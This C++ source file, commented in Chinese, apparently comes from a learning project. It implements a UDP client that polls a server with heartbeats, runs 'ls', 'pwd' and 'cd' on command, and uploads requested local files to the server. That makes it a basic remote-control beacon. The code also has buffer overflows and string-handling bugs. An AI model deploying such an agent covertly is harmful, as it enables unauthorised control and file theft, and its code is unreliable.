#include <iostream>
#include "Client.h"
#include <unistd.h>
using namespace std;

Client::Client() {
    // 初始化socket
    socket_fd = 0;
}

//连接服务器
void Client::Connect() {
    cout << "正在连接服务器: " << SERVER_IP << " : " << SERVER_PORT << "..." <<endl;

    //创建socket, SOCK_DGRAM也就是数据报, 也就是UDP协议
    socket_fd = socket(AF_INET, SOCK_DGRAM, 0);

    server_len = sizeof(server_addr);
    bzero(&server_addr, server_len);
    //初始化要连接的服务器地址和端口
    server_addr.sin_family = AF_INET; //走本地
    server_addr.sin_port = htons(SERVER_PORT);
    //函数名中的p和n非别代表表达（presentation）和数值（numeric）。地址的表达格式通常是ASCII字符串，数值格式则是存放到套接字地址结构中的二进制值。
    server_addr.sin_addr.s_addr = inet_addr(SERVER_IP);

    reply_addr = (struct sockaddr *)malloc(server_len);
    
    if (socket_fd < 0) {
        perror("创建sock失败!");
        exit(-1); 
    }

    memset(&sendMsg, 0, sizeof(Msg));
    sendMsg.event = NEW_CLIENT;
    sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len);
    recvfrom(socket_fd, recv_line, MAXLINE, 0, reply_addr, &len);
    cout << "服务器连接成功!" << endl;
}

//命令的处理
void Client::dealCmd(char *cmd) {
    int length = strlen(cmd);
    printf("cmd:%s\n", cmd);
    //ssize_t recvfrom(int sockfd, void *buff, size_t nbytes, int flags,
    //       struct sockaddr *from, socklen_t *addrlen);
    //UDP编程使用recvfrom函数, 返回值为实际接受的字节数
    memset(&sendMsg, 0, sizeof(Msg));
    sendMsg.event = FINISHED;
    //srencmp把 str1 和 str2 进行比较，最多比较前 n 个字节。
    if (strncmp(cmd, "ls", length) == 0) {
        char *result = run_cmd((char*)"ls");
        strcpy(sendMsg.data, result);
        //debug
        printf("正在处理ls\n");
        if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0){
            return ;
        }
        //debug
        printf("处理ls完成\n");
        //处理完毕, 释放内存
        free(result);
    } else if (strncmp(cmd, "pwd", length) == 0) {
        char buf[256];
        char *result = getcwd(buf, 256);
        strcpy(sendMsg.data, result);
        if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0)
            return ;
    } else if (strncmp(cmd, "cd ", 3) == 0) {
        char target[256];
        bzero(target, sizeof(target));
        memcpy(target, cmd + 3, strlen(cmd) - 3);
        if (chdir(target) == -1) {
            char buf[1000]={0};
            char *now = getcwd(buf, 256);
            char *msg = (char*)"改变目录失败, 当前目录为:";
            strcpy(buf, msg); strcpy(buf, now);
            strcpy(sendMsg.data, buf);
            if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0)
                return ;
        } else {
            char buf[1000]={0};
            char *now = getcwd(buf, 256);
            char *msg = (char*)"改变目录成功, 当前目录为:";
            strcpy(buf, msg); strcpy(buf, now);
            strcpy(sendMsg.data, buf);
            if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0)
                return ;
        }
    } else if (strncmp(cmd, "download ", 9) == 0){
        sendMsg.event = SENDFILE;
        char target[256];
        bzero(target, sizeof(target));
        memcpy(target, cmd + 9, strlen(cmd) - 9);
        sendFile(target);
    } else if (strncmp(cmd, "upload ", 7) == 0) {
        sendMsg.event = RECVFILE;
        strcpy(sendMsg.data, cmd);
        if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0)
            return ;
    } else {
        char *error = (char*)"error: 未知的输入命令!";
        strcpy(sendMsg.data, error);
        if (sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len) < 0)
            return ;
    }
}

char* Client::GetFileName(char *path) {
    char *name = NULL;
    //在字符串 s 中查找字符 c，返回字符 c 第一次在字符串 s 中出现的位置，如果未找到字符 c，则返回 NULL。
	if (NULL != (name = strrchr(path, '/')))
		return name + 1;
	else if (NULL != (name = strrchr(path, '\\')))
		return name + 1;
	else
		return path;
}

int Client::get_size(FILE *fp) {
    int pre_pos, size;

	pre_pos = ftell(fp);
	fseek(fp, 0, SEEK_END);
	size = ftell(fp);
	fseek(fp, pre_pos, SEEK_SET);

	return size;
}

void Client::recvFile() {
    char buffer[BUF_SIZE];
	int recvBytes;
	FILE *fp;

	// 首先接受这个文件名
	recvBytes = recvfrom(socket_fd, buffer, BUF_SIZE, 0,
		(struct sockaddr *)&server_addr, &server_len);
	if (recvBytes < 0) {
		perror("从服务端接受失败!\n");
		exit(1);
	}
	buffer[recvBytes] = '_';
    buffer[recvBytes+1] = '\0';
    //先创建这个文件, buffer是接收的文件名
	fp = fopen(buffer, "wb");
    printf("正在接收文件%s\n", buffer);
	// 从客户端每次接受BUF_SIZE大小的数据块
	while (true) {
		recvBytes = recvfrom(socket_fd, buffer, BUF_SIZE, 0,
			(struct sockaddr *)&server_addr, &server_len);
		if (recvBytes < 0) {
			printf("接受文件失败!\n");
			exit(1);
		}
		fwrite(buffer, recvBytes, 1, fp);
		// 如果数据块的大小比BUF_SIZE小, 那么这就意味着这是最后一块数据了, 那么我们就可以停止接收了 
		if (recvBytes < BUF_SIZE)
			break;
	}
	fclose(fp);
    printf("文件接受完成!\n");
	return ;
}

void Client::sendFile(char *filepath) {
    char *filePath = filepath;
	char *fileName = NULL;
	fileName = GetFileName(filePath);
    sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0,(struct sockaddr *)&server_addr, server_len);

    //首先把文件的名字发过去
	char buffer[BUF_SIZE];
	int sendBytes = sendto(socket_fd, fileName, strlen(fileName), 0,
		(struct sockaddr *)&server_addr, server_len);
	if (sendBytes < 0) {
		printf("发送失败!\n");
		exit(1);
	}

	FILE *fp = fopen(filePath, "rb");
	if (fp == NULL) {
		perror("打开文件失败!\n");
		exit(1);
	}
	int fileSize = get_size(fp);
	int sentSize = 0;
	int flag = 1;
	while (flag) {
		int readBytes = fread(buffer, 1, BUF_SIZE, fp);
		if (readBytes < BUF_SIZE) {
			if (feof(fp))
				flag = 0;
			else {
				perror("读取失败!\n");
				exit(1);
			}
		}

		sendBytes = sendto(socket_fd, buffer, readBytes, 0,
			(struct sockaddr *)&server_addr, server_len);
		sentSize += sendBytes;
		printf("sended: %.1f%%\r", ((float)sentSize * 100) / fileSize);
		if (sendBytes < 0) {
			printf("发送失败!\n");
			exit(1);
		}
	}

	fclose(fp);
}

void Client::Close() {
    //关闭套接字
    close(socket_fd);
}

void Client::Start() {
    //连接服务器
    reply_addr = (struct sockaddr*)malloc(server_len);
    Connect();

    char send_line[MAXLINE] = {0}, recv_line[MAXLINE + 1] = {0};
    socklen_t len;
    int n;
    while (1) {
        //发送轮询包
        memset(&sendMsg, 0, sizeof(Msg));
        sendMsg.event = HEAT_BEAT;
        size_t rt = sendto(socket_fd, (char*)&sendMsg, sizeof(Msg), 0, (struct sockaddr *) &server_addr, server_len);
        if (rt < 0) {
            perror("send failed ");
        }

        n = recvfrom(socket_fd, (char*)&recvMsg, sizeof(Msg), 0, reply_addr, &len);
        if (recvMsg.event == SLEEP) {
            usleep(2000);
        } else if (recvMsg.event == EXCUTE_CMD) {
            printf("recvData:%s\n", recvMsg.data);
            dealCmd(recvMsg.data);
        } else if (recvMsg.event == SENDFILE) {
            recvFile();
        }
    }

    Close();
}

char* Client::run_cmd(char *cmd) {
    //malloc分配足够的内存空间
    char *data = (char*)malloc(16384);
    //置字节字符串data的前n个字节为零
    bzero(data, sizeof(data));
    //创建文件指针
    FILE *fdp;
    //指定最大缓冲区的大小
    const int max_buffer = 256;
    char buffer[max_buffer];

    //FILE *popen(const char *command, const char *type);
    //Linux中的popen()函数可以在程序中执行一个shell命令，并返回命令执行的结果。
    //有两种操作模式，分别为读和写。
    //在读模式中，程序中可以读取到命令的输出，其中有一个应用就是获取网络接口的参数。
    //在写模式中，最常用的是创建一个新的文件或开启其他服务等。
    fdp = popen(cmd, "r");
    //data为这块区域的头, data_index改变指针指向的位置, 不断在这块区域上面赋值
    char *data_index = data;
    if (fdp) {
        //fgetc（或者getc）函数返回 EOF 并不一定就表示文件结束，读取文件出错时也会返回 EOF
        //使用 feof 函数来替换 EOF 宏检测文件是否结束。当然，在用 feof 函数检测文件是否结束的同时，也需要使用 ferror 函数来检测文件读取操作是否出错
        while (!feof(fdp)) {          
            //从fdp读取不超过max_buffer个字符到缓冲区, 然后再从缓冲区复制到data数组中
            if (fgets(buffer, max_buffer, fdp) != NULL) {
                int len = strlen(buffer);
                memcpy(data_index, buffer, len);
                data_index += len;
            }
        }
        //popen打开的必须用pclose关闭
        pclose(fdp);
    }
    //返回头指针
    return data;
}